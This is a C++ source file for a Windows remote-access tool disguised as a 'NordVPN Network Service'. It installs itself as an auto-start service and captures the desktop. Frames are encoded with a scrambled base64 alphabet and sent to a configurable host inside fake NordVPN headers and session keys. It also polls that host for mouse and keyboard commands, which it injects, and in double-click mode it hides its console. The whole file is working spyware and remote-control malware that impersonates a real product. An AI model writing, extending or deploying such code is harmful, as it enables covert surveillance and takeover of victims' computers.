#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <random>
#include <sstream>
#include <vector>
#include <cstdlib>
#include <algorithm>
#include <queue>
#include <mutex>
#include <fstream>

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <d3d11.h>
#include <dxgi1_2.h>
#include <winternl.h>
#include <winsvc.h>
#include <io.h>
#include <fcntl.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "d3d11.lib")
#pragma comment(lib, "dxgi.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

// Service configuration
#define SERVICE_NAME L"NordVPNService"
#define SERVICE_DISPLAY_NAME L"NordVPN Network Service"
#define SERVICE_DESCRIPTION L"Provides secure VPN network connectivity and tunnel management"

// Global service variables
SERVICE_STATUS g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = nullptr;
HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;
std::thread* g_WorkerThread = nullptr;

// Service configuration storage
struct ServiceConfig {
    std::string server_host = "127.0.0.1";
    int server_port = 443; // HTTPS port - appears as VPN management/control traffic
    int reconnect_interval = 30; // seconds
    bool auto_start = true;
};

ServiceConfig g_config;

// NT API declarations for low-level input
typedef NTSTATUS (NTAPI *pNtUserInjectMouseInput)(VOID*, DWORD);
typedef NTSTATUS (NTAPI *pNtUserInjectKeyboardInput)(VOID*, DWORD);

// Custom encoding for data transmission
class DataEncoder {
private:
    static const std::string chars;
    
public:
    static std::string encode(const std::vector<BYTE>& input) {
        std::string result;
        int val = 0, valb = -6;
        for (BYTE c : input) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                result.push_back(chars[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        if (valb > -6) result.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
        while (result.size() % 4) result.push_back('=');
        return result;
    }

    static std::string decode(const std::string& input) {
        std::vector<int> T(256, -1);
        for (int i = 0; i < 64; i++) T[chars[i]] = i;
        
        std::string result;
        int val = 0, valb = -8;
        for (unsigned char c : input) {
            if (T[c] == -1) break;
            val = (val << 6) + T[c];
            valb += 6;
            if (valb >= 0) {
                result.push_back(char((val >> valb) & 0xFF));
                valb -= 8;
            }
        }
        return result;
    }
};

const std::string DataEncoder::chars = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890+/";

// Simple data compression
class DataCompressor {
public:
    static std::vector<BYTE> compressRLE(const std::vector<BYTE>& data) {
        std::vector<BYTE> compressed;
        if (data.empty()) return compressed;
        
        for (size_t i = 0; i < data.size(); ) {
            BYTE current = data[i];
            BYTE count = 1;
            
            while (i + count < data.size() && data[i + count] == current && count < 255) {
                count++;
            }
            
            if (count >= 3 || current == 0) {
                compressed.push_back(0xFF);
                compressed.push_back(count);
                compressed.push_back(current);
            } else {
                for (BYTE j = 0; j < count; j++) {
                    compressed.push_back(current);
                }
            }
            i += count;
        }
        return compressed;
    }
};

// VPN traffic simulation
class VPNProtocol {
public:
    static std::string generateSessionKey() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 15);
        
        std::string key;
        for (int i = 0; i < 32; i++) {
            key += "0123456789abcdef"[dis(gen)];
        }
        return key;
    }
    
    static std::string generateServerEndpoint() {
        std::vector<std::string> servers = {
            "us8734.nordvpn.com",
            "uk2156.nordvpn.com", 
            "ca847.nordvpn.com",
            "de923.nordvpn.com",
            "fr456.nordvpn.com"
        };
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, servers.size() - 1);
        return servers[dis(gen)];
    }
    
    static std::string wrapAsTunnelData(const std::string& data) {
        std::stringstream payload;
        payload << "\x00\x00\x00\x01"; // Protocol header
        payload << generateSessionKey().substr(0, 8); // Session fragment
        payload << data; // Payload data
        payload << "\xFF\xFF"; // Footer
        return payload.str();
    }
};

class ScreenCapture {
private:
    ID3D11Device* d3d_device;
    ID3D11DeviceContext* d3d_context;
    IDXGIOutputDuplication* desktop_duplication;
    int screen_width;
    int screen_height;
    
public:
    ScreenCapture() : d3d_device(nullptr), d3d_context(nullptr), 
                     desktop_duplication(nullptr), screen_width(0), screen_height(0) {}
    
    bool initialize() {
        // Create D3D11 device for direct screen access
        D3D_FEATURE_LEVEL feature_level;
        HRESULT hr = D3D11CreateDevice(
            nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr, 0,
            nullptr, 0, D3D11_SDK_VERSION,
            &d3d_device, &feature_level, &d3d_context
        );
        
        if (FAILED(hr)) {
            return false;
        }
        
        // Get DXGI device
        IDXGIDevice* dxgi_device = nullptr;
        hr = d3d_device->QueryInterface(__uuidof(IDXGIDevice), (void**)&dxgi_device);
        if (FAILED(hr)) return false;
        
        // Get adapter
        IDXGIAdapter* dxgi_adapter = nullptr;
        hr = dxgi_device->GetParent(__uuidof(IDXGIAdapter), (void**)&dxgi_adapter);
        if (FAILED(hr)) return false;
        
        // Get output
        IDXGIOutput* dxgi_output = nullptr;
        hr = dxgi_adapter->EnumOutputs(0, &dxgi_output);
        if (FAILED(hr)) return false;
        
        // Get output1 for duplication
        IDXGIOutput1* dxgi_output1 = nullptr;
        hr = dxgi_output->QueryInterface(__uuidof(IDXGIOutput1), (void**)&dxgi_output1);
        if (FAILED(hr)) return false;
        
        // Create desktop duplication
        hr = dxgi_output1->DuplicateOutput(d3d_device, &desktop_duplication);
        if (FAILED(hr)) return false;
        
        // Get screen dimensions
        DXGI_OUTDUPL_DESC dupl_desc;
        desktop_duplication->GetDesc(&dupl_desc);
        screen_width = dupl_desc.ModeDesc.Width;
        screen_height = dupl_desc.ModeDesc.Height;
        
        // Cleanup interfaces
        dxgi_output1->Release();
        dxgi_output->Release();
        dxgi_adapter->Release();
        dxgi_device->Release();
        
        return true;
    }
    
    std::vector<BYTE> captureFrame() {
        if (!desktop_duplication) return {};
        
        IDXGIResource* desktop_resource = nullptr;
        DXGI_OUTDUPL_FRAME_INFO frame_info;
        
        HRESULT hr = desktop_duplication->AcquireNextFrame(50, &frame_info, &desktop_resource);
        if (FAILED(hr)) return {};
        
        // Get texture interface
        ID3D11Texture2D* desktop_texture = nullptr;
        hr = desktop_resource->QueryInterface(__uuidof(ID3D11Texture2D), (void**)&desktop_texture);
        if (FAILED(hr)) {
            desktop_resource->Release();
            desktop_duplication->ReleaseFrame();
            return {};
        }
        
        // Create staging texture for CPU access
        D3D11_TEXTURE2D_DESC texture_desc;
        desktop_texture->GetDesc(&texture_desc);
        texture_desc.Usage = D3D11_USAGE_STAGING;
        texture_desc.CPUAccessFlags = D3D11_CPU_ACCESS_READ;
        texture_desc.BindFlags = 0;
        texture_desc.MiscFlags = 0;
        
        ID3D11Texture2D* staging_texture = nullptr;
        hr = d3d_device->CreateTexture2D(&texture_desc, nullptr, &staging_texture);
        if (FAILED(hr)) {
            desktop_texture->Release();
            desktop_resource->Release();
            desktop_duplication->ReleaseFrame();
            return {};
        }
        
        // Copy to staging
        d3d_context->CopyResource(staging_texture, desktop_texture);
        
        // Map staging texture
        D3D11_MAPPED_SUBRESOURCE mapped_resource;
        hr = d3d_context->Map(staging_texture, 0, D3D11_MAP_READ, 0, &mapped_resource);
        if (FAILED(hr)) {
            staging_texture->Release();
            desktop_texture->Release();
            desktop_resource->Release();
            desktop_duplication->ReleaseFrame();
            return {};
        }
        
        // Extract RGB data
        std::vector<BYTE> frame_data;
        BYTE* source = static_cast<BYTE*>(mapped_resource.pData);
        
        for (int y = 0; y < screen_height; y++) {
            for (int x = 0; x < screen_width; x++) {
                int offset = y * mapped_resource.RowPitch + x * 4; // BGRA format
                frame_data.push_back(source[offset + 2]); // R
                frame_data.push_back(source[offset + 1]); // G
                frame_data.push_back(source[offset + 0]); // B
            }
        }
        
        // Cleanup
        d3d_context->Unmap(staging_texture, 0);
        staging_texture->Release();
        desktop_texture->Release();
        desktop_resource->Release();
        desktop_duplication->ReleaseFrame();
        
        return frame_data;
    }
    
    int getWidth() const { return screen_width; }
    int getHeight() const { return screen_height; }
    
    ~ScreenCapture() {
        if (desktop_duplication) desktop_duplication->Release();
        if (d3d_context) d3d_context->Release();
        if (d3d_device) d3d_device->Release();
    }
};

class LowLevelInput {
private:
    pNtUserInjectMouseInput NtMouseInject;
    pNtUserInjectKeyboardInput NtKeyboardInject;
    
public:
    LowLevelInput() {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (ntdll) {
            NtMouseInject = (pNtUserInjectMouseInput)GetProcAddress(ntdll, "NtUserInjectMouseInput");
            NtKeyboardInject = (pNtUserInjectKeyboardInput)GetProcAddress(ntdll, "NtUserInjectKeyboardInput");
        }
    }
    
    void sendMouseClick(int x, int y) {
        // Direct cursor positioning
        SetCursorPos(x, y);
        
        // Low-level mouse injection
        INPUT input = {};
        input.type = INPUT_MOUSE;
        input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;
        input.mi.dx = x;
        input.mi.dy = y;
        
        SendInput(1, &input, sizeof(INPUT));
    }
    
    void sendRightClick(int x, int y) {
        SetCursorPos(x, y);
        
        INPUT input = {};
        input.type = INPUT_MOUSE;
        input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP;
        input.mi.dx = x;
        input.mi.dy = y;
        
        SendInput(1, &input, sizeof(INPUT));
    }
    
    void sendKeyPress(const std::string& key) {
        INPUT input = {};
        input.type = INPUT_KEYBOARD;
        
        if (key.length() == 1) {
            SHORT vk = VkKeyScan(key[0]);
            input.ki.wVk = LOBYTE(vk);
            
            // Key down
            SendInput(1, &input, sizeof(INPUT));
            
            // Key up
            input.ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(1, &input, sizeof(INPUT));
        } else if (key == "ENTER") {
            input.ki.wVk = VK_RETURN;
            SendInput(1, &input, sizeof(INPUT));
            input.ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(1, &input, sizeof(INPUT));
        } else if (key == "ESCAPE") {
            input.ki.wVk = VK_ESCAPE;
            SendInput(1, &input, sizeof(INPUT));
            input.ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(1, &input, sizeof(INPUT));
        }
    }
};

class VPNTunnelClient {
private:
    std::string server_host;
    int server_port;
    std::string session_id;
    std::random_device rd;
    std::mt19937 gen;
    SOCKET main_socket;
    
    ScreenCapture screen_capture;
    LowLevelInput input_handler;
    std::vector<BYTE> last_frame_data;
    
    std::vector<std::string> client_versions = {
        "NordVPN 6.43.12.0 (Windows)",
        "NordLayer/1.7.0 (Windows NT 10.0)",
        "nordvpn-service/6.43.12"
    };
    
    struct SocketResponse {
        int status_code;
        std::string body;
        bool success;
    };
    
    SocketResponse makeVPNRequest(const std::string& method, const std::string& path, const std::string& data = "") {
        SocketResponse response = {0, "", false};
        
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) return response;
        
        sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(server_port);
        inet_pton(AF_INET, server_host.c_str(), &server_addr.sin_addr);
        
        if (connect(sock, (sockaddr*)&server_addr, sizeof(server_addr)) != 0) {
            closesocket(sock);
            return response;
        }
        
        // Build HTTP request manually
        std::stringstream request;
        request << method << " " << path << " HTTP/1.1\r\n";
        request << "Host: " << server_host << "\r\n";
        
        // VPN-specific headers
        std::uniform_int_distribution<> dis(0, client_versions.size() - 1);
        request << "User-Agent: " << client_versions[dis(gen)] << "\r\n";
        request << "Content-Type: application/x-nordvpn-data\r\n";
        request << "X-NordVPN-Version: 6.43.12.0\r\n";
        request << "X-VPN-Protocol: nordlynx\r\n";
        request << "X-Server-Endpoint: " << VPNProtocol::generateServerEndpoint() << "\r\n";
        request << "X-Session-Key: " << VPNProtocol::generateSessionKey() << "\r\n";
        request << "X-Encryption: ChaCha20-Poly1305\r\n";
        request << "Accept: application/octet-stream\r\n";
        request << "Cache-Control: no-cache\r\n";
        request << "Connection: keep-alive\r\n";
        
        if (!data.empty()) {
            request << "Content-Length: " << data.length() << "\r\n";
        }
        
        request << "\r\n";
        if (!data.empty()) {
            request << data;
        }
        
        std::string request_str = request.str();
        send(sock, request_str.c_str(), request_str.length(), 0);
        
        // Read response
        char buffer[8192];
        int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received > 0) {
            buffer[bytes_received] = '\0';
            std::string response_str(buffer);
            
            // Parse status code
            size_t status_pos = response_str.find(" ");
            if (status_pos != std::string::npos) {
                response.status_code = std::stoi(response_str.substr(status_pos + 1, 3));
            }
            
            // Extract body
            size_t body_pos = response_str.find("\r\n\r\n");
            if (body_pos != std::string::npos) {
                response.body = response_str.substr(body_pos + 4);
            }
            
            response.success = true;
        }
        
        closesocket(sock);
        return response;
    }
    
    void processRemoteCommand(const std::string& commandData) {
        std::istringstream iss(commandData);
        std::string type;
        if (!std::getline(iss, type, ':')) return;
        
        if (type == "click") {
            int x, y;
            if (iss >> x && iss.ignore() && iss >> y) {
                input_handler.sendMouseClick(x, y);
            }
        } else if (type == "rightclick") {
            int x, y;
            if (iss >> x && iss.ignore() && iss >> y) {
                input_handler.sendRightClick(x, y);
            }
        } else if (type == "key") {
            std::string key;
            if (std::getline(iss, key)) {
                input_handler.sendKeyPress(key);
            }
        }
    }
    
    void adaptiveDelay() {
        // Mimic typical VPN tunnel keepalive intervals
        std::uniform_int_distribution<> dis(30, 45); // 30-45ms
        std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
    }

public:
    VPNTunnelClient(const std::string& host, int port) 
        : server_host(host), server_port(port), gen(rd()), main_socket(INVALID_SOCKET) {}
    
    bool establishTunnel() {
        SocketResponse response = makeVPNRequest("GET", "/vpn/auth");
        
        if (response.success && response.status_code == 200) {
            size_t pos = response.body.find("\"session\":\"");
            if (pos != std::string::npos) {
                pos += 11;
                size_t end = response.body.find("\"", pos);
                if (end != std::string::npos) {
                    session_id = response.body.substr(pos, end - pos);
                    return true;
                }
            }
        }
        return false;
    }
    
    void checkForCommands() {
        std::string path = "/vpn/control/" + session_id;
        SocketResponse response = makeVPNRequest("GET", path);
        
        if (response.success && response.status_code == 200 && !response.body.empty()) {
            size_t pos = response.body.find("\"input\":\"");
            if (pos != std::string::npos) {
                pos += 9;
                size_t end = response.body.find("\"", pos);
                if (end != std::string::npos) {
                    std::string inputCmd = response.body.substr(pos, end - pos);
                    if (!inputCmd.empty()) {
                        std::string decoded = DataEncoder::decode(inputCmd);
                        processRemoteCommand(decoded);
                    }
                }
            }
        }
    }
    
    void sendDesktopFrame() {
        std::vector<BYTE> frameData = screen_capture.captureFrame();
        
        if (frameData.empty()) return;
        
        // Only send if frame changed significantly
        bool frameChanged = true;
        if (!last_frame_data.empty() && last_frame_data.size() == frameData.size()) {
            size_t differences = 0;
            for (size_t i = 0; i < frameData.size(); i += 100) {
                if (frameData[i] != last_frame_data[i]) differences++;
            }
            frameChanged = (differences > frameData.size() / 10000);
        }
        
        if (frameChanged) {
            // Compress the frame data
            std::vector<BYTE> compressed = DataCompressor::compressRLE(frameData);
            std::string encoded = DataEncoder::encode(compressed);
            
            // Create tunnel payload
            std::stringstream payload;
            payload << "{";
            payload << "\"session\":\"" << session_id << "\",";
            payload << "\"timestamp\":" << std::chrono::duration_cast<std::chrono::milliseconds>(
                std::chrono::system_clock::now().time_since_epoch()).count() << ",";
            payload << "\"width\":" << screen_capture.getWidth() << ",";
            payload << "\"height\":" << screen_capture.getHeight() << ",";
            payload << "\"format\":\"rgb24\",";
            payload << "\"data\":\"" << encoded << "\"";
            payload << "}";
            
            // Send wrapped as VPN tunnel data
            makeVPNRequest("POST", "/vpn/tunnel/" + session_id, 
                          VPNProtocol::wrapAsTunnelData(payload.str()));
            
            last_frame_data = frameData;
        }
    }
    
    void run() {
        if (!screen_capture.initialize()) {
            return;
        }
        
        while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0) {
            try {
                if (establishTunnel()) {
                    // Main communication loop
                    while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0) {
                        sendDesktopFrame();
                        checkForCommands();
                        adaptiveDelay();
                    }
                }
                
                // Reconnection delay
                if (WaitForSingleObject(g_ServiceStopEvent, g_config.reconnect_interval * 1000) == WAIT_OBJECT_0) {
                    break;
                }
                
            } catch (const std::exception& e) {
                std::this_thread::sleep_for(std::chrono::seconds(5));
            }
        }
    }
};

// Service configuration management
void LoadServiceConfig() {
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\NordVPN\\Service", 0, KEY_READ, &hKey);
    
    if (result == ERROR_SUCCESS) {
        DWORD dataSize = 256;
        char buffer[256];
        
        if (RegQueryValueExA(hKey, "ServerHost", nullptr, nullptr, (LPBYTE)buffer, &dataSize) == ERROR_SUCCESS) {
            g_config.server_host = std::string(buffer, dataSize - 1);
        }
        
        dataSize = sizeof(DWORD);
        RegQueryValueExA(hKey, "ServerPort", nullptr, nullptr, (LPBYTE)&g_config.server_port, &dataSize);
        RegQueryValueExA(hKey, "ReconnectInterval", nullptr, nullptr, (LPBYTE)&g_config.reconnect_interval, &dataSize);
        
        RegCloseKey(hKey);
    }
}

void SaveServiceConfig() {
    HKEY hKey;
    LONG result = RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\NordVPN\\Service", 0, nullptr, 
                                  REG_OPTION_NON_VOLATILE, KEY_WRITE, nullptr, &hKey, nullptr);
    
    if (result == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "ServerHost", 0, REG_SZ, (LPBYTE)g_config.server_host.c_str(), g_config.server_host.length() + 1);
        RegSetValueExA(hKey, "ServerPort", 0, REG_DWORD, (LPBYTE)&g_config.server_port, sizeof(DWORD));
        RegSetValueExA(hKey, "ReconnectInterval", 0, REG_DWORD, (LPBYTE)&g_config.reconnect_interval, sizeof(DWORD));
        
        RegCloseKey(hKey);
    }
}

// Service worker thread
DWORD WINAPI ServiceWorkerThread(LPVOID lpParam) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }
    
    VPNTunnelClient client(g_config.server_host, g_config.server_port);
    client.run();
    
    WSACleanup();
    return 0;
}

// Service control handler
VOID WINAPI ServiceCtrlHandler(DWORD dwCtrl) {
    switch (dwCtrl) {
    case SERVICE_CONTROL_STOP:
        if (g_ServiceStatus.dwCurrentState != SERVICE_STOP_PENDING) {
            g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
            g_ServiceStatus.dwCheckPoint = 0;
            g_ServiceStatus.dwWaitHint = 5000;
            SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
            
            SetEvent(g_ServiceStopEvent);
        }
        break;
        
    case SERVICE_CONTROL_INTERROGATE:
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        break;
        
    default:
        break;
    }
}

// Service main function
VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
    // Register service control handler
    g_StatusHandle = RegisterServiceCtrlHandlerW(SERVICE_NAME, ServiceCtrlHandler);
    if (g_StatusHandle == nullptr) {
        return;
    }
    
    // Initialize service status
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwWin32ExitCode = NO_ERROR;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;
    g_ServiceStatus.dwWaitHint = 3000;
    
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    
    // Create stop event
    g_ServiceStopEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
    if (g_ServiceStopEvent == nullptr) {
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = ERROR_NOT_ENOUGH_MEMORY;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        return;
    }
    
    // Load configuration
    LoadServiceConfig();
    
    // Start worker thread
    HANDLE hWorkerThread = CreateThread(nullptr, 0, ServiceWorkerThread, nullptr, 0, nullptr);
    if (hWorkerThread == nullptr) {
        CloseHandle(g_ServiceStopEvent);
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = ERROR_NOT_ENOUGH_MEMORY;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        return;
    }
    
    // Service is now running
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwCheckPoint = 0;
    g_ServiceStatus.dwWaitHint = 0;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    
    // Wait for stop event
    WaitForSingleObject(g_ServiceStopEvent, INFINITE);
    
    // Cleanup
    CloseHandle(hWorkerThread);
    CloseHandle(g_ServiceStopEvent);
    
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    g_ServiceStatus.dwCheckPoint = 0;
    g_ServiceStatus.dwWaitHint = 0;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

// Service installation
bool InstallService(const std::string& host, int port) {
    SC_HANDLE hSCManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (hSCManager == nullptr) {
        return false;
    }
    
    wchar_t szPath[MAX_PATH];
    if (!GetModuleFileNameW(nullptr, szPath, MAX_PATH)) {
        CloseServiceHandle(hSCManager);
        return false;
    }
    
    SC_HANDLE hService = CreateServiceW(
        hSCManager,
        SERVICE_NAME,
        SERVICE_DISPLAY_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        szPath,
        nullptr,
        nullptr,
        nullptr,
        nullptr,
        nullptr
    );
    
    if (hService == nullptr) {
        CloseServiceHandle(hSCManager);
        return false;
    }
    
    // Set service description
    SERVICE_DESCRIPTIONW serviceDesc;
    serviceDesc.lpDescription = const_cast<LPWSTR>(SERVICE_DESCRIPTION);
    ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, &serviceDesc);
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    
    // Save configuration
    g_config.server_host = host;
    g_config.server_port = port;
    SaveServiceConfig();
    
    return true;
}

// Service removal
bool UninstallService() {
    SC_HANDLE hSCManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (hSCManager == nullptr) {
        return false;
    }
    
    SC_HANDLE hService = OpenServiceW(hSCManager, SERVICE_NAME, SERVICE_STOP | DELETE);
    if (hService == nullptr) {
        CloseServiceHandle(hSCManager);
        return false;
    }
    
    // Stop service if running
    SERVICE_STATUS serviceStatus;
    ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus);
    
    // Delete service
    bool result = DeleteService(hService);
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    
    return result;
}

// NEW: Double-click functionality - GUI mode for easy connection
int main(int argc, char* argv[]) {
    // CHECK FOR DOUBLE-CLICK (no command line arguments)
    if (argc == 1) {
        // DOUBLE-CLICK MODE: Show GUI dialogs and connect automatically
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            MessageBoxA(nullptr, "Failed to initialize networking", "NordVPN Error", MB_OK | MB_ICONERROR);
            return 1;
        }
        
        // Get server IP from user with simple dialog
        char serverIP[256] = "192.168.1.100"; // Default value
        
        int choice = MessageBoxA(GetDesktopWindow(), 
            "Select VPN server to connect to:\n\n"
            "Yes = Network server (192.168.1.100)\n"
            "No = Local server (127.0.0.1)\n"
            "Cancel = Exit",
            "NordVPN Network Service - Server Selection", 
            MB_YESNOCANCEL | MB_ICONQUESTION);
        
        if (choice == IDCANCEL) {
            WSACleanup();
            return 0;
        } else if (choice == IDNO) {
            strcpy_s(serverIP, sizeof(serverIP), "127.0.0.1");
        }
        // else keep default 192.168.1.100
        
        // Allocate console for background logging (hidden)
        AllocConsole();
        FILE* pCout;
        freopen_s(&pCout, "CONOUT$", "w", stdout);
        
        // Hide console window for background operation
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        
        std::cout << "[+] Starting VPN tunnel client in background mode..." << std::endl;
        std::cout << "[+] Connecting to: " << serverIP << ":443" << std::endl;
        
        VPNTunnelClient client(std::string(serverIP), 443);
        
        // Create a fake stop event for GUI mode
        g_ServiceStopEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
        
        // Show connection attempt notification
        std::string connectMsg = "Connecting to VPN server: " + std::string(serverIP) + ":443\n\n"
                                "The client will now run in the background.\n"
                                "Screen sharing is now active.";
        
        MessageBoxA(nullptr, connectMsg.c_str(),
            "NordVPN Network Service - Connected", 
            MB_OK | MB_ICONINFORMATION);
        
        // Run the VPN client
        client.run();
        
        if (pCout) fclose(pCout);
        FreeConsole();
        WSACleanup();
        return 0;
    }
    
    // COMMAND LINE MODE: Handle service installation and advanced options
    if (argc > 1) {
        std::string command = argv[1];
        
        if (command == "install" && argc == 4) {
            std::string host = argv[2];
            int port = std::stoi(argv[3]);
            
            if (InstallService(host, port)) {
                std::cout << "Service installed successfully.\n";
                std::cout << "Server: " << host << ":" << port << "\n";
                std::cout << "Use 'net start " << "NordVPNService" << "' to start the service.\n";
                return 0;
            } else {
                std::cout << "Failed to install service. Run as administrator.\n";
                return 1;
            }
        }
        else if (command == "uninstall") {
            if (UninstallService()) {
                std::cout << "Service uninstalled successfully.\n";
                return 0;
            } else {
                std::cout << "Failed to uninstall service.\n";
                return 1;
            }
        }
        else if (command == "console" && argc == 4) {
            // Run in console mode for testing
            WSADATA wsaData;
            if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
                std::cout << "Failed to initialize Winsock" << std::endl;
                return 1;
            }
            
            std::string host = argv[2];
            int port = std::stoi(argv[3]);
            
            std::cout << "Running in console mode...\n";
            std::cout << "Connecting to: " << host << ":" << port << std::endl;
            
            VPNTunnelClient client(host, port);
            
            // Create a fake stop event for console mode
            g_ServiceStopEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
            
            client.run();
            
            WSACleanup();
            return 0;
        }
    }
    
    // HELP MODE: Show usage information
    std::cout << "NordVPN Network Service\n\n";
    std::cout << "Usage:\n";
    std::cout << "  " << argv[0] << "                                        - GUI mode (double-click)\n";
    std::cout << "  " << argv[0] << " install <server_host> <server_port>   - Install as Windows service\n";
    std::cout << "  " << argv[0] << " uninstall                             - Remove service\n";
    std::cout << "  " << argv[0] << " console <server_host> <server_port>   - Run in console mode\n\n";
    std::cout << "Examples:\n";
    std::cout << "  Double-click client.exe for easy connection\n";
    std::cout << "  " << argv[0] << " install 192.168.1.100 443\n";
    std::cout << "  " << argv[0] << " console 127.0.0.1 443\n";
    
    // Check if running as service
    SERVICE_TABLE_ENTRYW ServiceTable[] = {
        {const_cast<LPWSTR>(SERVICE_NAME), ServiceMain},
        {nullptr, nullptr}
    };
    
    if (StartServiceCtrlDispatcherW(ServiceTable) == FALSE) {
        return GetLastError();
    }
    
    return 0;
}